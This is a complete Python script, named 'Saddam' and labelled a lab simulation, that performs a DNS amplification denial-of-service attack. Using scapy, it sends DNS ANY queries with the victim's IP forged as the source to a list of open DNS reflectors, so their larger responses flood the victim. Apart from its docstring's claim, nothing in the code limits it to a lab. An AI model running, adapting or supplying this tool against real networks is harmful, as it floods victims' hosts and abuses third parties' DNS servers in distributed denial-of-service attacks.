#!/usr/bin/env python3
"""
Saddam - DNS Amplification Tool (Lab Simulation Version)
Designed for educational cyber security drill inside isolated lab environments.
Usage:
    python3 saddam.py <victim_ip> -d <dns_list_file>:<domain>
Example:
    python3 saddam.py 10.2.6.20 -d dns.txt:www.test.com
"""

import sys
import os
import time
import argparse
from scapy.all import IP, UDP, DNS, DNSQR, send, Raw

def parse_args():
    parser = argparse.ArgumentParser(description="DNS Amplification Simulation Tool")
    parser.add_argument("victim", help="Victim IP address (spoofed source address)")
    parser.add_argument("-d", "--dns", required=True, help="DNS configuration in format <dns_file>:<domain>")
    parser.add_argument("-c", "--count", type=int, default=50, help="Number of packets to send (default: 50)")
    parser.add_argument("-i", "--interval", type=float, default=0.05, help="Interval between packets in seconds")
    return parser.parse_args()

def load_dns_servers(filepath):
    if not os.path.exists(filepath):
        print(f"[-] Error: DNS file '{filepath}' not found.")
        sys.exit(1)
    servers = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                servers.append(line)
    if not servers:
        print("[-] Error: No valid DNS server IPs found in file.")
        sys.exit(1)
    return servers

def run_amplification(victim_ip, dns_servers, domain, count, interval):
    print("=" * 60)
    print(f"[*] Starting DNS Amplification Simulation")
    print(f"[*] Spoofed Target (Victim) : {victim_ip}")
    print(f"[*] DNS Reflectors          : {dns_servers}")
    print(f"[*] Queried Domain          : {domain}")
    print(f"[*] Packet Count            : {count}")
    print("=" * 60)

    sent = 0
    try:
        for i in range(count):
            for dns_ip in dns_servers:
                # Construct DNS Request with Spoofed Source IP = Victim IP
                # Query ANY (type 255) or A record for maximum response payload amplification
                pkt = IP(src=victim_ip, dst=dns_ip) / \
                      UDP(sport=53, dport=53) / \
                      DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))
                send(pkt, verbose=False)
                sent += 1
                if sent % 10 == 0:
                    print(f"[+] Sent {sent} amplified DNS requests to reflector {dns_ip} -> reflecting to {victim_ip}")
                time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
    print(f"[✓] Finished. Total reflected packets sent: {sent}")

if __name__ == "__main__":
    args = parse_args()
    if ":" in args.dns:
        dns_file, domain = args.dns.split(":", 1)
    else:
        dns_file = args.dns
        domain = "www.test.com"

    servers = load_dns_servers(dns_file)
    run_amplification(args.victim, servers, domain, args.count, args.interval)
